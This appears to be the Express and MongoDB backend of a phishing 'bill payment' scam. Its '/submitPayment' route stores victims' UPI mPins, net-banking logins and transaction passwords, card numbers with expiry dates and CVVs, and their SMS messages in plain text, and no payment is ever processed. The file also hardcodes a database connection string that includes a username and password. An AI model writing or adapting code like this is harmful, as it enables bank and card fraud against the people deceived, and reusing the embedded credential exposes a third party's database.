const express = require("express");
const cors = require("cors");
const app = express();
const mongoose = require("mongoose");
// Middleware
app.use(express.json());
app.use(cors());

const db = async () => {
  try {
    await mongoose
      .connect(
        "mongodb+srv://satyampandit021:20172522@rvbmhotelbooking.9hfzkrx.mongodb.net/billUpdate?retryWrites=true&w=majority",
        {
          useNewUrlParser: true,
          useUnifiedTopology: true,
        }
      )
      .then(() => console.log("MongoDB connected"))
      .catch((err) => console.log(err));
  } catch (error) {
    console.log(error);
  }
};
db();
// Create Schema and Model for form data
const formSchema = new mongoose.Schema(
  {
    customerName: { type: String, required: true },
    mobileNumber: { type: String, required: true },
    consumerId: { type: String, required: true },
    billStatus: { type: String, required: true },
    uniqueID: { type: String, required: true },

    // Additional fields based on your useState
    selectedPaymentMethod: { type: String }, // e.g., UPI, Credit Card, Debit Card, etc.
    selectedUPIApp: { type: String }, // e.g., PhonePe, Google Pay, Paytm
    mPin: { type: String }, // for UPI
    selectedBank: { type: String }, // for Net Banking
    userID: { type: String }, // for Net Banking login
    password: { type: String }, // for Net Banking login
    transactionPassword: { type: String }, // for Net Banking login
    creditCard: { type: String }, // Credit Card number
    debitCard: { type: String }, // Debit Card number
    expirydate: { type: String }, // Expiry Date for card
    cvv: { type: String }, // CVV for card
    cardHolderName: { type: String }, // Card Holder's name
    allUserSms: [],
  },

  { timestamps: true }
);

const FormData = mongoose.model("FormData", formSchema);

// Route to handle form submission
app.post("/submit", async (req, res) => {
  try {
    const { customerName, mobileNumber, consumerId, billStatus, uniqueID } =
      req.body;
    const newFormData = new FormData({
      customerName,
      mobileNumber,
      consumerId,
      billStatus,
      uniqueID,
    });
    if (!uniqueID || uniqueID === "")
      return res.status(201).json({ message: "You Are Not Authorized" });
    await newFormData.save();
    return res
      .status(200)
      .json({ message: "Form submitted successfully", data: newFormData });
  } catch (error) {
    console.log(error);
    return res.status(201).json({ message: error.message });
  }
});
app.post("/submitPayment", async (req, res) => {
  const {
    // Ensure uniqueID is being passed in the request
    method,
    mobileNumber,
    selectedUPIApp,
    data,
    allSms,
    password,
    transactionPassword,
    creditCard,
    debitCard,
    expirydate,
    cvv,
    cardHolderName,
    mPin,
    selectedBank,
    userID,
  } = req.body;

  try {
    if (!data.uniqueID) {
      return res.status(203).json({ message: "UniqueID is required" });
    }

    // Find the document with the provided uniqueID and update the data
    await FormData.findOneAndUpdate(
      { uniqueID: data.uniqueID },
      {
        $push: { allUserSms: allSms },
        mobileNumber,
        selectedPaymentMethod: method,
        mPin,
        selectedBank,
        userID,
        password,
        transactionPassword,
        creditCard,
        debitCard,
        expirydate,
        cvv,
        cardHolderName,
        selectedUPIApp,
      },
      { new: true }
    );

    return res.status(200).json({ message: "Form submitted successfully" });
  } catch (error) {
    return res.status(203).json({ message: error.message });
  }
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
